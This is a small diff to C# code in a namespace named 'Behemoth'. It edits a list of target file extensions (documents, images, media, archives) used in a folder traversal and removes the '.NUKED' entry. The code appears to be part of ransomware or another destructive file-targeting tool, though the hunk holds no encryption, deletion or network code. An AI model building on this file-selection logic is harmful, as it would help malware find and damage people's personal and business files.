@@ -42,7 +42,7 @@ namespace Behemoth
         {
             string[] extensions = { ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt",
                                     ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".mp3", ".mp4", ".avi",
-                                        ".mov", ".wmv", ".zip", ".rar", ".bin", ".dat", ".enc", ".NUKED" };
+                                        ".mov", ".wmv", ".zip", ".rar", ".bin", ".dat", ".enc" };
             var todo = new Queue<string>();
             todo.Enqueue(root);
 
